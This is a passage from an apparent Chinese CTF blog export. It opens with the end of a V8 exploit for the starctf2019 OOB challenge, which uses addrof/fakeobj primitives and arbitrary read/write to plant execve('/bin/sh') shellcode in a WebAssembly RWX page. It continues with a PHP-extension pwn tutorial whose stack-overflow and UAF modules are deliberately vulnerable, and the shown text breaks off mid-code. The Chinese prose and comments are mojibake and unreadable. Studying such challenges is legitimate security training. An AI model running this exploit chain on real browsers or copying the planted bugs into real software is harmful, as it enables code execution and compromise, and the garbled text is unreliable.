//ä»å¯¹è±¡æ•°ç»„ä¸­è¯»å‡ºå¯¹è±¡ï¼Œä½†æ˜¯æ­¤æ—¶æ•´ä¸ªå¯¹è±¡æ•°ç»„å·²ç»è¢«æ”¹æˆæµ®ç‚¹æ•°ç»„ï¼Œæ‰€ä»¥ä¼šä»¥æµ®ç‚¹æ•°æ•°ç»„å½¢å¼è¯»å–ï¼Œå¾—åˆ°è¯¥å¯¹è±¡çš„åœ°å€\n    //æ­£å¸¸æƒ…å†µä»å¯¹è±¡æ•°ç»„ä¸­è¯»å–å¯¹è±¡ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œä¸æ˜¯è¯¥å¯¹è±¡çš„åœ°å€ï¼Œä½†æ˜¯è½¬æ¢æˆæµ®ç‚¹æ•°ç»„å°±ä¼šè¯»å–åˆ°æˆå‘˜çš„åœ°å€ï¼Œè¿™å°±æ˜¯ç±»å‹æ··æ·†\n    let obj_addr = mem.f2i(obj_array[0])\n    obj_array.oob(obj_array_map);//é‡æ–°è®¾ç½®å›æ¥\n    return obj_addr;\n}\n\n\nfunction getFakeObj(addr)\n{\n    float_array[0] = mem.i2f(addr);//è®¾ç½®æµ®ç‚¹æ•°æ•°ç»„\n    float_array.oob(obj_array_map);//å°†æµ®ç‚¹æ•°æ•°ç»„è½¬åŒ–ä¸ºå¯¹è±¡æ•°ç»„\n    let fake_obj = float_array[0];//è·å–è½¬åŒ–ä¹‹åçš„å¯¹è±¡æ•°ç»„ï¼Œå°±èƒ½å¾—åˆ°è¯¥fake_objï¼Œå…¶åœ°å€ä¸ºaddrï¼Œå¯¹è±¡ç±»å‹ä¸ºå­—å…¸å¯¹è±¡\n    float_array.oob(float_array_map);//é‡æ–°è®¾ç½®å›æ¥\n    return fake_obj;\n}\n\n\n\n\nlet fake_array = [\n    float_array_map,\n    mem.i2f(0n),\n    mem.i2f(0x41414141n),\n    mem.i2f(0x1000000000n),\n    1.1,\n    2.2,\n];\nlet fake_array_addr = getAddress(fake_array);\nlet fake_object_addr = fake_array_addr - 0x40n + 0x10n;\nlet fake_object = getFakeObj(fake_object_addr);\nconsole.log(\"[*] fake_array_addr:\" + hex(fake_array_addr));\nconsole.log(\"[*] fake_object_addr:\" + hex(fake_object_addr));\n\nfunction read64(addr)\n{\n    fake_array[2] = mem.i2f(addr - 0x10n + 0x1n);\n    let leak_data = mem.f2i(fake_object[0]);\n    console.log(\"[*] leak from: \" +hex(addr) + \": \" + hex(leak_data));\n    return leak_data;\n}\n\nfunction write64(addr, data)\n{\n    fake_array[2] = mem.i2f(addr - 0x10n + 0x1n);\n    fake_object[0] = mem.i2f(data);\n    console.log(\"[*] write to : \" +hex(addr) + \": \" + hex(data));    \n}\n\nfunction writeAny(addr,data)\n{\n  let data_buf = new ArrayBuffer(data.length * 8);\n  let data_view = new DataView(data_buf);\n  let buf_backing_store_addr = getAddress(data_buf) + 0x20n;\n  console.log(\"[*] buf_backing_store_addr: \"+hex(buf_backing_store_addr));\n\n  write64(buf_backing_store_addr-1n,addr);\n  for (let i = 0; i < data.length; ++i)\n    data_view.setFloat64(i * 8, mem.i2f(data[i]), true);\n}\n\nlet wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);\nlet wasmModule = new WebAssembly.Module(wasmCode);\nlet wasmInstance = new WebAssembly.Instance(wasmModule, {});\nlet f = wasmInstance.exports.main;\nlet wasm_instance_addr = getAddress(wasmInstance);\nconsole.log(\"[*] wasm_instance_addr: \" + hex(wasm_instance_addr));\nlet rwx_page_addr = read64(wasm_instance_addr -1n + 0x88n);\nconsole.log(\"[*] rwx_page_addr: \" + hex(rwx_page_addr));\nlet shellcode = [\n  0x2fbb485299583b6an,\n  0x5368732f6e69622fn,\n  0x050f5e5457525f54n\n];\nwriteAny(rwx_page_addr,shellcode);\n//%SystemBreak();\nf();\n\n```\n\n![image-20220322194115446](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221941594.png)\n\n\n\n\n\n[starctf2019/pwn-OOB at master Â· sixstars/starctf2019 (github.com)](https://github.com/sixstars/starctf2019/tree/master/pwn-OOB)\n\n","tags":["V8"],"categories":["PWN","V8"]},{"title":"PHP_PWN","url":"/2022/02/10/PHP_PWN/","content":"\n# ä¸€ã€phpæ‹“å±•æ¨¡å—æ­å»ºå’Œç¼–å†™\n\n## 1.åˆ›å»ºæ¨¡å—æ¨¡æ¿\n\næ‰¾åˆ°phpæºç ç›®å½•\n\n![image-20220210174644261](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120778.png)\n\nç„¶åä½¿ç”¨`ext_skel`åˆ›å»ºä¸€ä¸ªæ¨¡æ¿\n\n```\n./ext_skel --extname=helloworld\n```\n\n## 2.ç¼–è¯‘æ¨¡å—\n\néšåè¿›è¡Œç¼–è¯‘ï¼Œè·³è½¬åˆ°åˆšåˆšç”Ÿæˆçš„æ¨¡å—æ–‡ä»¶å¤¹è·¯å¾„`/path_to_php_src/ext/helloworld`ï¼Œç„¶åç¼–è¯‘\n\n```\n/www/server/php/56/bin/phpize\n./configure  --with-php-config=/www/server/php/56/bin/php-config\n```\n\nè¿™é‡Œéœ€è¦æŒ‡å®šä¸€ä¸‹`--with-php-config`ï¼Œé€‰æ‹©è‡ªå·±çš„`php-config`ï¼Œå½“ç„¶å¦‚æœæœ¬åœ°çš„ç¯å¢ƒå˜é‡binå‘½ä»¤ä¸‹ç›´æ¥æœ‰`php-config`ä¹Ÿä¸ç”¨æŒ‡å®šäº†ï¼Œéšå\n\n```\nmake\n```\n\nè¿™æ ·å°±å¯ä»¥åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†\n\n![image-20220210175900511](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120756.png)\n\nå…¶ä¸­`helloworld.c`å³ä¸ºåˆ›å»ºçš„æ¨¡æ¿ä»£ç ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ5.6ç‰ˆæœ¬çš„ç¼–è¯‘å®Œæˆåï¼Œä¸ç”Ÿæˆ.soæ¨¡å—æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬ç‰¹æ€§ï¼Ÿ\n\n```C\n/* helloword extension for PHP */\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_helloword.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n\tZEND_PARSE_PARAMETERS_START(0, 0) \\\n\tZEND_PARSE_PARAMETERS_END()\n#endif\n\n/* {{{ void helloword_test1()\n */\nPHP_FUNCTION(helloword_test1)\n{\n\tZEND_PARSE_PARAMETERS_NONE();\n\n\tphp_printf(\"The extension %s is loaded and working!\\r\\n\", \"helloword\");\n}\n/* }}} */\n\n/* {{{ string helloword_test2( [ string $var ] )\n */\nPHP_FUNCTION(helloword_test2)\n{\n\tchar *var = \"World\";\n\tsize_t var_len = sizeof(\"World\") - 1;\n\tzend_string *retval;\n\n\tZEND_PARSE_PARAMETERS_START(0, 1)\n\t\tZ_PARAM_OPTIONAL\n\t\tZ_PARAM_STRING(var, var_len)\n\tZEND_PARSE_PARAMETERS_END();\n\n\tretval = strpprintf(0, \"Hello %s\", var);\n\n\tRETURN_STR(retval);\n}\n/* }}}*/\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(helloword)\n{\n#if defined(ZTS) && defined(COMPILE_DL_HELLOWORD)\n\tZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n\treturn SUCCESS;\n}\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(helloword)\n{\n\tphp_info_print_table_start();\n\tphp_info_print_table_header(2, \"helloword support\", \"enabled\");\n\tphp_info_print_table_end();\n}\n/* }}} */\n\n/* {{{ arginfo\n */\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)\n\tZEND_ARG_INFO(0, str)\nZEND_END_ARG_INFO()\n/* }}} */\n\n/* {{{ helloword_functions[]\n */\nstatic const zend_function_entry helloword_functions[] = {\n\tPHP_FE(helloword_test1,\t\targinfo_helloword_test1)\n\tPHP_FE(helloword_test2,\t\targinfo_helloword_test2)\n\tPHP_FE_END\n};\n/* }}} */\n\n/* {{{ helloword_module_entry\n */\nzend_module_entry helloword_module_entry = {\n\tSTANDARD_MODULE_HEADER,\n\t\"helloword\",\t\t\t\t\t/* Extension name */\n\thelloword_functions,\t\t\t/* zend_function_entry */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n\tPHP_RINIT(helloword),\t\t\t/* PHP_RINIT - Request initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n\tPHP_MINFO(helloword),\t\t\t/* PHP_MINFO - Module info */\n\tPHP_HELLOWORD_VERSION,\t\t/* Version */\n\tSTANDARD_MODULE_PROPERTIES\n};\n/* }}} */\n\n#ifdef COMPILE_DL_HELLOWORD\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(helloword)\n#endif\n\n```\n\n## ğŸ”ºæ³¨ï¼šä¸åŒç‰ˆæœ¬åˆ›å»ºæ¨¡æ¿\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨php7.3ä»¥ä¸Šï¼Œ`ext_skel`è¿™ä¸ªshellå˜æˆäº†`ext_skel.php`ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹æ¥åˆ›å»º\n\n```\n/www/server/php/73/bin/php ./ext_skel.php --ext helloword\ncd helloworld\n/www/server/php/73/bin/phpize\n./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config\nmake\n```\n\n## ğŸ”ºæ³¨ï¼šé»˜è®¤çš„ä¿æŠ¤æªæ–½\n\nåŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨configureè®¾ç½®å®Œä¹‹åï¼Œä¿æŠ¤æªæ–½ä¹Ÿéœ€è¦è®¾ç½®ä¸€ä¸‹ï¼Œé»˜è®¤ç¼–è¯‘çš„ä¿æŠ¤å¦‚ä¸‹ï¼š\n\n![image-20220212124731449](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121247504.png)\n\nå¯ä»¥çœ‹åˆ°é™¤äº†RELROæ²¡æœ‰åŠ å¼ºä¿æŠ¤ä¹‹å¤–ï¼Œå…¶ä»–éƒ½åŠ å…¥äº†ï¼Œæˆ‘ä»¬åœ¨Makefileä¸­å¯ä»¥è¿›è¡Œç›¸å…³çš„ä¿æŠ¤æªæ–½æ¶ˆé™¤\n\nè¿™é‡Œè¯•äº†å¾ˆå¤šéï¼Œè²Œä¼¼åªèƒ½å…³æ‰Canaryä¿æŠ¤å’ŒFORTIFYä¿æŠ¤\n\n![image-20220212125859899](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121258947.png)\n\n\n\n\n\n## 3.åŠ è½½æ¨¡å—\n\n### æ–¹æ³•ä¸€ï¼š\n\nç›´æ¥`make install`ï¼Œç„¶ååœ¨å¯¹åº”çš„php.iniä¸­æ·»åŠ `extension=helloword.so`\n\n### æ–¹æ³•äºŒï¼š\n\nå¤åˆ¶modulesä¸‹çš„helloworld.soæ¨¡å—åˆ°å¯¹åº”çš„phpæ‰©å±•ç›®å½•\n\n```\ncp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/\n```\n\nåŒæ ·ä¹Ÿå¾—åœ¨php.iniä¸­æ·»åŠ extension\n\nä¹‹åä½¿ç”¨æ¨¡æ¿ä¸­å‡½æ•°æµ‹è¯•å³å¯\n\n```\n<?php\nhelloword_test1();\n?>\n```\n\nå¦‚ä¸‹å³å¯æˆåŠŸ\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120676.png)\n\nè¿™ä¸ªphpæ‹“å±•æ¨¡å—å…¶å®è·Ÿlinuxå†…æ ¸æœ‰ç‚¹åƒ\n\n## ğŸ”ºæ³¨ï¼šphp.iniçš„è®¾ç½®\n\néœ€è¦æ³¨æ„çš„æ˜¯php.ini(php-fpmçš„php.ini)å’Œphp-cli.ini(php-cliçš„php.ini)çš„åŒºåˆ«è®¾ç½®\n\nå¯¹äºphp-fpmçš„php.iniï¼Œåªä¼šåœ¨webæœåŠ¡å™¨ä¸Šç”Ÿæ•ˆï¼Œè€Œå¯¹äºphp-cliçš„php.iniæ‰æ˜¯åœ¨å‘½ä»¤è¡Œä¸­ç”Ÿæ•ˆï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬éœ€è¦ä½¿ç”¨å‘½ä»¤è¡Œç›´æ¥è°ƒè¯•phpï¼Œé‚£ä¹ˆå°±éœ€è¦ä¿®æ”¹php-cliä¸­çš„php.iniæ‰è¡Œçš„ã€‚ä»¥ä¸‹æ˜¯ç”¨å®å¡”linuxæ­å»ºçš„Phpç¯å¢ƒï¼Œå¦‚æœåœ¨å‘½ä»¤è¡Œä¸­ç”Ÿæ•ˆåˆ™éœ€è¦ä¿®æ”¹Php-cli.iniæ‰è¡Œçš„ã€‚\n\n![image-20220211160511335](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111605414.png)\n\n\n\n\n\n## 4.ç¼–å†™å‡½æ•°\n\nä»¥ä¸‹æ˜¯php7åŠä»¥ä¸Šçš„è¯­æ³•ï¼Œä¹‹å‰ç‰ˆæœ¬çš„ä¼šæœ‰æ‰€ä¸åŒ\n\n### (1)PHP_FUNCTION\n\n### â‘ æ¡†æ¶ç¼–å†™\n\nç”±`PHP_FUNCTION` ä¿®é¥°çš„å‡½æ•°ç›¸å½“äºç›´æ¥çš„å®šä¹‰å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å®šä¹‰å‡½æ•°æ—¶ï¼Œéœ€è¦ç”¨è¯¥ä¿®é¥°ç¬¦æ¥ä¿®é¥°ï¼Œæ ¼å¼å¦‚ä¸‹\n\n```c\nPHP_FUNCTION(funcName)\n{\n\tZEND_PARSE_PARAMETERS_NONE();\n\n\tphp_printf(\"The extension %s is loaded and working!\\r\\n\", \"helloword\");\n}\n```\n\nè‡³äºè¿™ä¸ª`ZEND_PARSE_PARAMETERS_NONE();`ä»£è¡¨å®šä¹‰çš„è¯¥å‡½æ•°æ— å‚æ•°ä¼ é€’ã€‚\n\n### â‘¡å‚æ•°ä¼ é€’\n\nè€Œå½“æˆ‘ä»¬éœ€è¦ç»™å‡½æ•°ä¼ é€’å‚æ•°æ—¶ï¼Œå°±éœ€è¦ç”¨åˆ°`ZEND_PARSE_PARAMETERS_START`æ¥è®¾ç½®å‡½æ•°çš„å‚æ•°ä¸ªæ•°\n\n```c\nchar *var = \"World\";\nsize_t var_len = sizeof(\"World\") - 1;\nZEND_PARSE_PARAMETERS_START(0, 1)       \n    Z_PARAM_OPTIONAL             \n    Z_PARAM_STRING(var, var_len)   \nZEND_PARSE_PARAMETERS_END(); \n\n//è€ç‰ˆæœ¬å†™æ³•ï¼š\nchar *var = NULL;\nsize_t var_len;\nif (zend_parse_parameters(ZEND_NUM_ARGS(), \"s\", &var, &var_len) == FAILURE) {\n    return;\n}\n```\n\nä¸Šè¿°çš„`ZEND_PARSE_PARAMETERS_START(0, 1)`å³ä»£è¡¨ä¼ å…¥å‚æ•°ä¸ªæ•°ä¸º`0~1`ï¼Œå¯å˜ä¸ªæ•°ï¼Œå¦‚æœä¸ªæ•°ä¸ç¬¦åˆï¼Œåˆ™ä¼šè§¦å‘å¼‚å¸¸ã€‚åŒæ ·ä¹Ÿå¯ä»¥è®¾ç½®ä¸º`1~1`ï¼Œ`2~4`ç­‰ç­‰ä¹‹ç±»çš„ã€‚\n\n`Z_PARAM_STRING`ä»£è¡¨ä¸€ç§å‚æ•°ç±»å‹ï¼Œå³`char*`ï¼Œä¼ å…¥çš„å‚æ•°ç»™åˆ°varï¼Œé•¿åº¦ç»™åˆ°var_lenï¼Œè¿˜æœ‰çš„å…¶ä»–ç±»å‹å¦‚ä¸‹ã€‚\n\n```c\nspecifier    Fast ZPP API macro    args\n|    Z_PARAM_OPTIONAL\na    Z_PARAM_ARRAY(dest)    dest - zval*\nA    Z_PARAM_ARRAY_OR_OBJECT(dest)    dest - zval*\nb    Z_PARAM_BOOL(dest)    dest - zend_bool\nC    Z_PARAM_CLASS(dest)    dest - zend_class_entry*\nd    Z_PARAM_DOUBLE(dest)    dest - double\nf    Z_PARAM_FUNC(fci, fcc)    fci - zend_fcall_info, fcc - zend_fcall_info_cache\nh    Z_PARAM_ARRAY_HT(dest)    dest - HashTable*\nH    Z_PARAM_ARRAY_OR_OBJECT_HT(dest)    dest - HashTable*\nl    Z_PARAM_LONG(dest)    dest - long\nL    Z_PARAM_STRICT_LONG(dest)    dest - long\no    Z_PARAM_OBJECT(dest)    dest - zval*\nO    Z_PARAM_OBJECT_OF_CLASS(dest, ce)    dest - zval*\np    Z_PARAM_PATH(dest, dest_len)    dest - char*, dest_len - int\nP    Z_PARAM_PATH_STR(dest)    dest - zend_string*\nr    Z_PARAM_RESOURCE(dest)    dest - zval*\ns    Z_PARAM_STRING(dest, dest_len)    dest - char*, dest_len - int\nS    Z_PARAM_STR(dest)    dest - zend_string*\nz    Z_PARAM_ZVAL(dest)    dest - zval*\n     Z_PARAM_ZVAL_DEREF(dest)    dest - zval*\n+    Z_PARAM_VARIADIC('+', dest, num)    dest - zval*, num int\n*    Z_PARAM_VARIADIC('*', dest, num)    dest - zval*, num int\n```\n\nå‚ç…§ï¼š[AntCTF ^ D3CTF 2021 hackphp - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/233831#h3-3)\n\n### â‘¢å‚æ•°ä¿¡æ¯å®šä¹‰\n\n```c\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)\n\tZEND_ARG_INFO(0, str)\nZEND_END_ARG_INFO()\n```\n\nè¿™é‡Œå°±åœ¨`ZEND_BEGIN_ARG_INFO`ä¸­å®šä¹‰äº†å‚æ•°arginfo_helloword_test1å’Œarginfo_helloword_test2ï¼Œç„¶ååœ¨`ZEND_ARG_INFO`ä¸­è®¾ç½®å‚æ•°åç§°ï¼Œåœ¨`ZEND_ARG_INFO`ä¸­ç¬¬ä¸€ä¸ªå‚æ•°ä»£è¡¨æ˜¯å¦ä¸ºå¼•ç”¨ï¼Œç¬¬äºŒä¸ªå‚æ•°è®¾ç½®åç§°ï¼Œæ¯”å¦‚è¿™é‡Œå°±è®¾ç½®ä¸º`str`ã€‚è¿™ä¸ªå‚æ•°ä¿¡æ¯çš„å®šä¹‰åœ¨ä¹‹åçš„å‡½æ•°æ³¨å†Œä¸­éœ€è¦ç”¨åˆ°ã€‚\n\nå‚ç…§ï¼š[Linuxä¸‹PHP7æ‰©å±•å¼€å‘å…¥é—¨æ•™ç¨‹3ï¼šç¼–å†™ç¬¬ä¸€ä¸ªå‡½æ•° | æ¯›è‹±ä¸œçš„ä¸ªäººåšå®¢ (maoyingdong.com)](https://www.maoyingdong.com/php7_extension_development_tutorial_3/)\n\n\n\n## (2)å‡½æ•°æ³¨å†Œ\n\nå’Œå†…æ ¸ç±»ä¼¼ï¼Œéœ€è¦å°†æˆ‘ä»¬ç¼–å†™çš„å‡½æ•°è¿›è¡Œæ³¨å†Œ\n\n```C\nstatic const zend_function_entry helloword_functions[] = {\n\tPHP_FE(helloword_test1,\t\targinfo_helloword_test1)\n\tPHP_FE(helloword_test2,\t\targinfo_helloword_test2)\n\tPHP_FE_END\n};\n```\n\nå¦‚ä¸Šï¼Œå³ä½¿ç”¨`PHP_FE`æ¥æ³¨å†Œå‡½æ•°ï¼Œéœ€è¦ä¼ å…¥å‡½æ•°åç§°å’Œå‡½æ•°å‚æ•°å®šä¹‰ä¿¡æ¯ã€‚\n\n## (3)æ¨¡å—æ³¨å†Œ\n\næœ€åæ•´ä¸ªæ¨¡å—ä½¿ç”¨`zend_module_entry`è¿›è¡Œæ¨¡å—æ³¨å†Œ\n\n```c\nzend_module_entry helloword_module_entry = {\n\tSTANDARD_MODULE_HEADER,\n\t\"helloword\",\t\t\t\t\t/* Extension name */\n\thelloword_functions,\t\t\t/* zend_function_entry */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n\tPHP_RINIT(helloword),\t\t\t/* PHP_RINIT - Request initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n\tPHP_MINFO(helloword),\t\t\t/* PHP_MINFO - Module info */\n\tPHP_HELLOWORD_VERSION,\t\t/* Version */\n\tSTANDARD_MODULE_PROPERTIES\n};\n```\n\n\n\n\n\n# äºŒã€è°ƒè¯•phpæ‹“å±•\n\n## 1.æŸ¥æ‰¾æ¨¡å—\n\næŸ¥æ‰¾phpæ‹“å±•æ¨¡å—\n\n```\nphp -i | grep extensions\nphp -i | grep -i extension_dir\n```\n\n## 2.å¼€å§‹è°ƒè¯•\n\nå¦‚ä¸‹ï¼Œè°ƒè¯•phpç¨‹åºï¼Œç„¶åè·‘èµ·æ¥ï¼Œä½¿å¾—åŠ è½½è¿›å…¥æ‹“å±•æ¨¡å—ï¼Œctrl+cä¸­æ–­åå³å¯å¯¹ç‰¹å®šå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œç„¶åå†è·‘`test.php`ï¼Œè¯¥phpè°ƒç”¨éœ€è¦è°ƒè¯•çš„æ‹“å±•æ¨¡å—ä¸­çš„å‡½æ•°ï¼Œç»§ç»­è¿è¡Œå³å¯æ–­ç‚¹ã€‚\n\n```\ngdb /www/server/php/73/bin/php\nr\n(ctrl+cä¸­æ–­)\nb zif_funcName\nr test.php\nc\n```\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨æ‹“å±•æ¨¡å—æ³¨å†Œçš„å‡½æ•°æœ€ç»ˆéƒ½ä¼šä»¥`zif_`æ•´ä¸ªå‰ç¼€è¿›è¡Œä¿®é¥°ï¼Œæ‰€ä»¥å½“åšCTFé¢˜æ—¶ï¼Œç›´æ¥æœç´¢zifä»ä¸­å¯»æ‰¾å‡½æ•°è¿›è¡Œè§£æå³å¯ã€‚\n\nå¦‚ä¸‹\n\n![image-20220211111702925](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111117225.png)\n\n\n\n## ğŸ”ºæµ‹è¯•ç”¨ä¾‹\n\n### (1)æ ˆæ¨¡å—\n\nä¼ å…¥ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œæ‹·è´ç»™dataï¼Œå¯¼è‡´æ ˆæº¢å‡º\n\n```c\n/* my_stack extension for PHP */\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_my_stack.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n\tZEND_PARSE_PARAMETERS_START(0, 0) \\\n\tZEND_PARSE_PARAMETERS_END()\n#endif\n\n\n\nPHP_FUNCTION(my_stack_gift)\n        {\n        \tchar gift_data[0x10];\n        \tzend_string *retval;\n            ZEND_PARSE_PARAMETERS_NONE();\n            php_printf(\"PHP_Stack Gift function!---000\\n\");\n\t\t    retval = strpprintf(0, \"Gift_Stack:0x%lx\\nGift_Libc:0x%lx\\nGift_ELF:0x%lx\\n\",&gift_data,&printf,&zif_my_stack_gift);\n\t\t\tRETURN_STR(retval);\n        }\n\n\nPHP_FUNCTION(my_stack_func)\n        {\n        \t\n        \tchar* buf = \"stackTest\";\n        \tsize_t buf_len = sizeof(\"stackTest\") - 1;\n        \tZEND_PARSE_PARAMETERS_START(1,1)\n            Z_PARAM_STRING(buf, buf_len)\n            ZEND_PARSE_PARAMETERS_END();\n\n\n\t\t\tchar data[0x10];\n        \tphp_printf(\"Welcome to my Stack!\\n\");\n        \tphp_printf(\"\t\t   --PIG-007\\n\");\n\n        \tphp_printf(\"Gift_Stack:0x%lx\\n\",&data);\n\t\t    php_printf(\"Gift_Libc:0x%lx\\n\",&printf);\n\t\t    php_printf(\"Gift_ELF:0x%lx\\n\",&zif_my_stack_func);\n\n        \tmemcpy(data,buf,buf_len);\n        \tphp_printf(\"Over!\\n\");\n        }\n\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(my_stack)\n{\n#if defined(ZTS) && defined(COMPILE_DL_MY_STACK)\n\tZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n\treturn SUCCESS;\n}\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(my_stack)\n{\n\tphp_info_print_table_start();\n\tphp_info_print_table_header(2, \"my_stack support\", \"enabled\");\n\tphp_info_print_table_end();\n}\n/* }}} */\n\n/* {{{ arginfo\n */\n\nZEND_BEGIN_ARG_INFO(arginfo_my_stack_gift, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_my_stack_func, 0)\nZEND_ARG_INFO(0, data)\nZEND_END_ARG_INFO()\n/* }}} */\n\n/* {{{ my_stack_functions[]\n */\nstatic const zend_function_entry my_stack_functions[] = {\n\tPHP_FE(my_stack_gift,\t\targinfo_my_stack_gift)\n\tPHP_FE(my_stack_func,\t\targinfo_my_stack_func)\n\tPHP_FE_END\n};\n/* }}} */\n\n/* {{{ my_stack_module_entry\n */\nzend_module_entry my_stack_module_entry = {\n\tSTANDARD_MODULE_HEADER,\n\t\"my_stack\",\t\t\t\t\t/* Extension name */\n\tmy_stack_functions,\t\t\t/* zend_function_entry */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n\tPHP_RINIT(my_stack),\t\t\t/* PHP_RINIT - Request initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n\tPHP_MINFO(my_stack),\t\t\t/* PHP_MINFO - Module info */\n\tPHP_MY_STACK_VERSION,\t\t/* Version */\n\tSTANDARD_MODULE_PROPERTIES\n};\n/* }}} */\n\n#ifdef COMPILE_DL_MY_STACK\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(my_stack)\n#endif\n\n```\n\n\n\n### (2)å †æ¨¡å—\n\nUAFï¼Œæº¢å‡ºï¼ŒdoubleFreeç­‰æ¼æ´\n\næµ‹è¯•ä»£ç ï¼Œå¦‚ä¸‹å³ä¸ºç”¨php7.3ç¼–è¯‘çš„ä»£ç ï¼Œå®ç°å››ä¸ªå‡½æ•°ï¼Œå¢åˆ æ”¹æŸ¥\n\n```\nmy_heap_addFunc(18);\nmy_heap_delFunc(0);\nmy_heap_editFunc(0,'aaa');\nmy_heap_getFunc(0);\n```\n\né¢˜ç›®ä»£ç ï¼š\n\n```c\n/* my_heap extension for PHP */\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_my_heap.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n\tZEND_PARSE_PARAMETERS_START(0, 0) \\\n\tZEND_PARSE_PARAMETERS_END()\n#endif\n\n\n\nstatic char* notelist[1000];\nstatic int count;\n\n\nPHP_FUNCTION(my_heap_gift)\n        {\n        \tchar data[0x10];\n        \tzend_string *retval;\n            ZEND_PARSE_PARAMETERS_NONE();\n            php_printf(\"PHP_HEAP Gift function!---000\\n\");\n\t\t    retval = strpprintf(0, \"Gift_Stack:0x%lx\\nGift_Libc:0x%lx\\nGift_ELF:0x%lx\\n\",&data,&printf,&zif_my_heap_gift);\nRETURN_STR(retval);\n        }\n\n\n\n\nPHP_FUNCTION(my_heap_addFunc)\n        {\n                long size = 10;\n                char* chunk = NULL;\n                //zend_string *retval;\n                php_printf(\"PHP_HEAP Add function!---001\\n\");\n\n                ZEND_PARSE_PARAMETERS_START(1, 1)\n                Z_PARAM_LONG(size)\n                ZEND_PARSE_PARAMETERS_END();\n                chunk = _emalloc(size);\n                php_printf(\"chunk_addr:0x%lx\\n\", chunk);\n                //retval = strpprintf(0, \"chunk_addr:0x%lx\", chunk);\n                if (!chunk)\n                {\n                    php_printf(\"Alloca Error\\n\");\n                    return 0;\n                }\n\n                //HELLO_G(greeting) ++;\n                notelist[count] = chunk;\n                chunk = NULL;\n                count ++;\n        }\n\n\nPHP_FUNCTION(my_heap_delFunc)\n        {\n        \tlong idx = 0;\n            php_printf(\"PHP_HEAP Free function!---002\\n\");\n\n            